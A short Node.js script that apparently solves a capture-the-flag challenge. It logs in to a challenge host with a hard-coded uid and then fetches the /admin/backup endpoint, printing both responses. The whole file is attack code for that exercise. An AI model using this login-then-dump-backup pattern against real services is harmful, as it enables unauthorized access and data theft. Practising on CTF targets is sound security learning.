
const http = require('http');
const querystring = require('querystring');

const postData = querystring.stringify({
  "uid": "093f2fff41654320930244c2990d203b"
});

const options = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(postData)
  }
};

const req = http.request(options, (res) => {
  let body = '';
  res.on('data', chunk => body += chunk);
  res.on('end', () => {
    console.log("Login response:");
    console.log(body);
    // Now get backup
    getBackup();
  });
});

req.on('error', err => console.error(err));
req.write(postData);
req.end();

function getBackup() {
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/admin/backup',
    method: 'GET'
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => {
      console.log("\nBackup response:");
      console.log(body);
    });
  });
  req.end();
}
